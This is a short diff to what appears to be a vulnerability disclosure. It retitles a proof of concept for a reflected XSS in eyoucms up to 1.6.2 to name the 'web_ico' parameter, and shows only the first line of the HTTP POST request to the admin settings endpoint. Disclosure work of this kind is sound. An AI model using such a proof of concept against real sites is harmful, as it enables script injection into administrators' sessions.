@@ -1,4 +1,4 @@
-eyoucms up to 1.6.2  reflected xss vulnerability POC: 
+eyoucms up to 1.6.2 'web_ico' reflected xss vulnerability POC: 
 
 ```
 POST /eyoucms/login.php?m=admin&c=System&a=web&lang=cn HTTP/1.1
